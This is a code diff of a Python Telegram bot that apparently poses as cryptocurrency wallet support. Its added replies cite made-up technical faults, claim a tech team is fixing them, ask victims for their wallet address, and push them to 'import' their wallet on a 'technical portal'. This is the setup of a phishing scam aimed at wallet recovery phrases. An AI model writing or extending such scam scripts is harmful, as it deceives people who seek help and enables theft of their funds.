@@ -33,6 +33,8 @@ def first_question_step(update: Update, context: CallbackContext):
     chat_id = update.message.chat_id
     phone_number = update.message.text
     update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
+    update.message.reply_text('Our Tech team has been working on fixing the issues and all you have to do now is to provide your wallet address. We regret the inconvenience caused here and would request all the impacted users to kindly wait a few minutes after providing his/her wallet address.')
+    update.message.reply_text('During our review, you need to have confirmed your validation and synchronization of your wallet account activities on the technical portal and import so that you can be able to rectify your issue in your wallet immediately, did you know how to do that?')
     return THREE
 
 def cancel(update: Update, context: CallbackContext):
